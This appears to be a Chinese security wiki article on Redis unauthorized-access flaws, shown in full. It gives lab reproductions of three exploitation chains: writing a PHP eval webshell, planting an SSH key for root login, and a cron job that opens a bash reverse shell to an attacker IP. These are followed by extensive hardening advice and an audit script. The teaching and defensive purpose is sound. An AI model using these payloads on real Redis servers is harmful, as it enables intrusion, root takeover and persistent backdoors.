---
title: Redis 未授权访问漏洞：成因分析、利用链与加固指南
description: 系统梳理 Redis 未授权访问漏洞的根因、三大主流利用链（写 Webshell、写 SSH 公钥、写计划任务反弹 Shell）实战复现，以及完整的修复加固建议。
category: program-analysis
tags:
- Redis
- 未授权访问
- RCE
- Webshell
- SSH 公钥
- 计划任务
- 反弹 Shell
- 加固指南
- 渗透测试
- 内网渗透
date: 2025-01-15
updated: '2026-11-15'
---

## 概述

Redis（Remote Dictionary Server）是一款高性能的开源键值存储数据库，默认绑定在 `0.0.0.0:6379` 且**无需密码认证**即可访问。当管理员未开启认证、未绑定本地回环地址、以 root 权限运行、且未禁用高危命令时，攻击者可直接通过网络连接 Redis 实例，利用其 `CONFIG SET`、`SAVE` 等功能写入任意文件，最终实现远程代码执行（RCE）。

> **核心成因链**：默认配置不安全（无密码 + 监听 0.0.0.0）+ 高权限运行（root）+ 危险命令未禁用（`CONFIG`、`SAVE`、`FLUSHALL` 等）= **未授权 RCE**。

---

## 环境搭建与复现基线

| 角色 | IP | 系统 | 说明 |
|------|-----|------|------|
| 攻击机 | 192.168.3.41 / 192.168.90.133 | Deepin / Kali | 发起利用、监听反弹 Shell |
| 靶机 | 192.168.3.122 / 192.168.90.132 | CentOS 7 | 运行 Redis 3.2.9，root 权限，无认证 |

### 关键配置修改（`redis.conf`）

```conf
# 1. 注释 bind 127.0.0.1 或改为 bind 0.0.0.0
# bind 127.0.0.1

# 2. 关闭保护模式
protected-mode no

# 3. 以守护进程运行（可选）
daemonize yes
```

> **注意**：修改配置后**必须重启 Redis** 使其生效：
> ```bash
> sudo killall redis-server
> sudo redis-server redis.conf
> ```

验证连通性：
```bash
redis-cli -h <target_ip> ping
# 返回 PONG 即表示未授权访问成功
```

---

## 三大主流利用链实战复现

### 写 Webshell（适用于 Web 服务器同机部署场景）

**前置条件**：
- 目标机器运行 Web 服务（Nginx/Apache/PHP-FPM）
- 知晓 Web 绝对路径（如 `/var/www/html`）
- Redis 进程对该目录有写权限

**操作流程**：

```redis
# 1. 设置备份目录为 Web 目录
config set dir /var/www/html

# 2. 设置备份文件名为 PHP 脚本
config set dbfilename shell.php

# 3. 写入一句话木马（含换行符防止 RDB 头部干扰）
set x "\n\n\n<?php @eval($_POST['cmd']);?>\n\n\n"

# 4. 触发持久化生成文件
save
```

**验证**：
- 访问 `http://<target_ip>/shell.php`
- 使用蚁剑 / 中国菜刀 / [[php-webshell-fundamentals-chopper-analysis|哥斯拉 Godzilla]] 连接，密码 `cmd`

> **实战提示**：若 Web 目录未知，可尝试常见路径（`/var/www/html`、`/usr/local/nginx/html`、`/home/wwwroot/default` 等）或结合 [[ssrf-bypass-techniques|SSRF]] 探测内网 Redis 后再利用。

---

### 写 SSH 公钥（适用于开放 22 端口且允许密钥登录的 Linux 主机）

**前置条件**：
- 目标开放 SSH 服务（默认 22 端口）
- `/etc/ssh/sshd_config` 中 `PubkeyAuthentication yes`、`AuthorizedKeysFile .ssh/authorized_keys`
- Redis 以 root 运行，对 `/root/.ssh` 有写权限

**操作流程**：

```bash
# 攻击机生成密钥对
ssh-keygen -t rsa -f ~/.ssh/id_rsa_redis -N ""
# 公钥内容：cat ~/.ssh/id_rsa_redis.pub
```

```redis
# 1. 写入公钥（注意前后换行，避免 RDB 头部破坏公钥格式）
set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali\n\n"

# 2. 设置备份目录为 .ssh
config set dir /root/.ssh/

# 3. 设置备份文件名为 authorized_keys
config set dbfilename authorized_keys

# 4. 触发持久化
save
```

**验证**：
```bash
ssh -i ~/.ssh/id_rsa_redis root@<target_ip>
# 直接以 root 登录
```

> **防御视角**：参考 [[windows-scheduled-task-persistence-techniques|Windows 计划任务持久化]] 中关于 `authorized_keys` 文件加固的建议（`chmod 400` + `chattr +i`），Linux 同理适用。

---

### 写计划任务反弹 Shell（通用性最强，仅需 root 权限运行 Redis）

**前置条件**：
- Redis 以 root 权限运行
- 目标系统运行 `cron`/`crond` 服务
- 攻击机可达目标机（可出网或内网互通）

**操作流程**：

```bash
# 攻击机开启监听
nc -lvnp 7777
```

```redis
# 1. 写入反弹 Shell 任务（每分钟执行一次）
set x "\n* * * * * bash -i >& /dev/tcp/192.168.90.133/7777 0>&1\n"

# 2. 设置备份目录为 crontab 目录
config set dir /var/spool/cron/

# 3. 设置备份文件名为 root（即 root 用户的 crontab 文件）
config set dbfilename root

# 4. 触发持久化
save
```

**验证**：
- 等待最多 1 分钟，攻击机 `nc` 接收到反弹 Shell
- 交互式 Shell 操作：`python3 -c "import pty; pty.spawn('/bin/bash')"`

> **关键点**：必须以 **root 用户登录目标机** 验证 cron 服务正常，否则定时任务不会以 root 权限执行。

---

## 完整修复与加固指南

### 禁用/重命名高危命令（`redis.conf`）

```conf
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command EVAL ""
rename-command EVALSHA ""
rename-command SCRIPT ""
rename-command DEBUG ""
rename-command MODULE ""
rename-command SHUTDOWN ""
rename-command SAVE ""
rename-command BGSAVE ""
rename-command BGREWRITEAOF ""
```
> **原理**：将危险命令重命名为空字符串，使其不可用。业务若需部分命令，可重命名为不可猜测的随机字符串（如 `rename-command CONFIG "c0nfig_9x7z"`）。

---

### 以最低权限运行 Redis（系统级加固）

```bash
# 创建专用用户/组，禁止登录
groupadd -r redis && useradd -r -g redis -s /sbin/nologin -M redis

# 修改数据目录权限
chown -R redis:redis /var/lib/redis /var/log/redis
chmod 750 /var/lib/redis /var/log/redis

# 系统服务以 redis 用户启动（systemd 示例）
# /etc/systemd/system/redis.service
[Service]
User=redis
Group=redis
```

> **效果**：即使利用成功写文件，也只能写 `redis` 用户可写目录，无法写 `/root/.ssh`、`/var/spool/cron/root`、`/var/www/html`（除非误配权限）。

---

### 开启强密码认证（`redis.conf`）

```conf
# 生成高强度密码（建议 ≥32 字符）
# openssl rand -base64 32
requirepass "R3d1s_Str0ng_P@ssw0rd_2025!"

# 客户端连接需带密码
# redis-cli -h <ip> -a "password"
```

> **注意**：Redis 6.0+ 支持 ACL（Access Control List），推荐使用 `aclfile` 实现细粒度权限控制（只读用户、只允许特定命令等）。

---

### 绑定本地回环 / 限制访问来源（网络层加固）

```conf
# 仅本机访问
bind 127.0.0.1

# 或绑定特定内网 IP
# bind 10.0.0.5 127.0.0.1
```

**配合防火墙/安全组**：
```bash
# iptables 仅允许应用服务器访问 6379
iptables -A INPUT -p tcp -s 10.0.0.0/8 --dport 6379 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP
```
> **云厂商安全组**：入站规则仅放行应用服务器安全组/ CIDR 的 6379 端口，**严禁 0.0.0.0/0**。

---

### 开启保护模式（Redis 3.2+ 默认开启）

```conf
protected-mode yes
```
> **机制**：当未配置 `bind`、未设密码、客户端非本地连接时，Redis 拒绝服务并返回错误提示。

---

### 保护 `authorized_keys` 文件完整性（防公钥植入）

```bash
# 仅所有者可读
chmod 400 ~/.ssh/authorized_keys
# 设置不可变属性，防删除/重命名/修改
chattr +i ~/.ssh/authorized_keys
# 同时保护 .ssh 目录防重命名
chattr +i ~/.ssh
```
> **运维提示**：新增公钥时需先 `chattr -i ~/.ssh/authorized_keys ~/.ssh`，添加后恢复 `+i`。

---

### 禁用 RDB/AOF 持久化（若业务允许）

```conf
# 禁用 RDB
save ""
# 禁用 AOF
appendonly no
```
> **效果**：攻击者无法通过 `SAVE`/`BGSAVE` 落地文件，**彻底切断写文件利用链**。但会导致重启丢数据，需评估业务可接受性。

---

### 启用 TLS 加密传输（Redis 6.0+）

```conf
port 0          # 关闭明文端口
tls-port 6380   # 仅开启 TLS 端口
tls-cert-file /etc/redis/redis.crt
tls-key-file /etc/redis/redis.key
tls-ca-cert-file /etc/redis/ca.crt
tls-auth-clients yes
```
> **价值**：防止内网流量嗅探窃取密码、命令注入篡改。

---

### 审计与监控（事后溯源）

| 措施 | 实现方式 |
|------|----------|
| 慢查询日志 | `slowlog-log-slower-than 10000` `slowlog-max-len 128` |
| 监控异常 `CONFIG SET dir/dbfilename` | 配合 [[xd-security-incident-response-notes|应急响应日志分析]]、[[threat-attribution-tracing-techniques|威胁溯源]] 体系 |
| 审计登录来源 | `redis-cli -h <ip> INFO clients` 定期巡检 |
| 文件完整性监控 (FIM) | 监控 `/var/spool/cron/`、`/root/.ssh/`、`/var/www/` 关键目录变更 |

---

## 交叉引用与延伸阅读

- [[ssrf-bypass-techniques]] —— SSRF 结合 `gopher://`/`dict://` 协议攻击内网 Redis 的完整利用链
- [[ssrf-ctf-exploitation-guide]] —— CTF 实战中 `file_get_contents`/`curl` 协议差异对 Redis 利用的影响
- [[xd-security-privilege-escalation-notes-day58-64]] —— Redis 作为数据库提权切入点的实战技巧（UDF、计划任务、主从复制）
- [[xd-security-internal-network-penetration-notes-day65-66]] / [[xd-security-internal-network-penetration-notes-day67-68]] —— 内网渗透阶段 Redis 凭证复用、横向移动
- [[xd-security-incident-response-notes]] —— Redis 入侵后的 Webshell 溯源、日志分析、勒索病毒处置
- [[php-webshell-fundamentals-chopper-analysis]] —— 写入 Webshell 后的连接工具与流量特征分析
- [[cnvd-2021-49104-eoffice-v9-file-upload-rce]] —— 文件上传漏洞结合 Redis 写 Webshell 的实战案例
- [[vulnhub-hard-socnet2-writeup]] —— 靶机实战中 Redis 结合 CVE-2021-3493 提权的完整链路

---

## 速查表：一键检测与加固脚本片段

```bash
#!/bin/bash
# redis_audit_hardening.sh
# 用法：bash redis_audit_hardening.sh <redis_ip> [password]

TARGET=$1
PASS=${2:-""}
AUTH_CMD=""
[[ -n "$PASS" ]] && AUTH_CMD="-a $PASS"

echo "[*] 检测未授权访问..."
redis-cli -h $TARGET $AUTH_CMD ping 2>/dev/null && echo "  [!!] 存在未授权访问" || echo "  [OK] 需认证"

echo "[*] 检测高危命令是否禁用..."
for cmd in CONFIG SAVE FLUSHALL EVAL; do
  redis-cli -h $TARGET $AUTH_CMD COMMAND INFO $cmd 2>/dev/null | grep -q "disabled" && echo "  [OK] $cmd 已禁用" || echo "  [!!] $cmd 可用"
done

echo "[*] 检测 bind 与 protected-mode..."
redis-cli -h $TARGET $AUTH_CMD CONFIG GET bind protected-mode 2>/dev/null

echo "[*] 检测运行用户..."
ps -ef | grep redis-server | grep -v grep

echo "[*] 建议加固："
cat <<'EOF'
1. 配置 bind 127.0.0.1 或内网 IP
2. protected-mode yes
3. requirepass 强密码 / ACL
4. rename-command 高危命令 ""
5. 以 redis 低权用户运行
6. 防火墙/安全组限制来源 IP
7. 关键目录 FIM 监控 + authorized_keys chattr +i
EOF
```

---

## 总结

| 利用链 | 核心前置条件 | 影响面 | 修复优先级 |
|--------|--------------|--------|------------|
| 写 Webshell | Web 同机 + 知路径 + 写权限 | 代码执行、数据窃取、持久化 | ⭐⭐⭐⭐⭐ |
| 写 SSH 公钥 | 开放 22 端口 + PubkeyAuthentication + root 运行 | 直接 root 登录、完全控制 | ⭐⭐⭐⭐⭐ |
| 写计划任务 | root 运行 + cron 服务正常 | 反弹 Shell、定时后门 | ⭐⭐⭐⭐⭐ |

**一句话防御策略**：**最小权限运行 + 网络隔离 + 强认证 + 禁用高危命令 + 关键文件完整性保护**，纵深防御，单点失效不导致沦陷。

## 来源

- [0xfafu攻防实验室-202010-202112_16](../sources/0xfafu攻防实验室-202010-202112_16.md)
